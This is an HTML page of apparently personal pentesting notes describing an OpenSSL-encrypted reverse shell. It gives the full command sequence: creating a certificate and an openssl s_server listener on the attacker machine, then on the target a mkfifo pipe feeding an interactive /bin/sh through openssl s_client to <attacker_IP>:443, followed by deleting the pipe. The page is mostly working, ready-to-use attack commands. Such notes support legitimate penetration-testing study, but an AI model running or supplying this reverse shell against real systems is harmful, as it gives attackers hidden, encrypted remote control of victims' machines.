<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>OpenSSL Reverse Shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>OpenSSL Reverse Shell</h1><br/><br /><br />This method involves to use an OpenSSL client and server-based technique in conjunction with what are known as <a href="https://en.wikipedia.org/wiki/Named_pipe#In_Unix">mkfifo</a> named pipes<br /><br />Check <a href="Home--Pentesting_Basics--Bash--output_redirectors--mkfifo.html">What are mkfifo named pipe &amp; How they work</a><br /><br />1. generate an SSL certificate key pair for our listener on the <span style="color:#ff0000;">attacker machine</span>. This will create two files, “key.pem” and “cert.pem” files<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># openssl req -x509 -newkey rsa<span style="color:#ff9d00;font-weight:700">:</span>4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre></div><br />2. start up a listener on the <span style="color:#ff0000;">attacker machine</span> using the <code>openssl s_server</code> command. That will start up an openSSL listener with our certificate and associated key on port 443<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># openssl s_server -quiet -key key.pem -cert cert.pem -port 443</pre></div><br />    *if the target use the old version of tls (tls 1.0)<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># openssl s_server -quiet -key key.pem -cert cert.pem -port 443 -tls1</pre></div><br />4. on the <span style="color:#1e90ff;">target system</span>, we create a mkfifo named pipe as a file called “x” in /tmp in conjunction with an <code>openssl s_client -quiet -connect</code> command that will connect back to our attacker machine, and give us a shell on the victim host (over SSL):<br />    <br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">mkfifo</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>x<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span> -i &lt; <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>x <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">|</span> openssl s_client -quiet -connect &lt;attacker_IP&gt;<span style="color:#ff9d00;font-weight:700">:</span>443 &gt; <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>x<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">rm</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>x</pre></div><br />    <a href=""><img src="images/1468-1.png" alt="images/1468-1.png" /></a><br />    <a href=""><img src="images/1468-2.png" alt="images/1468-2.png" /></a></div>
</body>
</html>
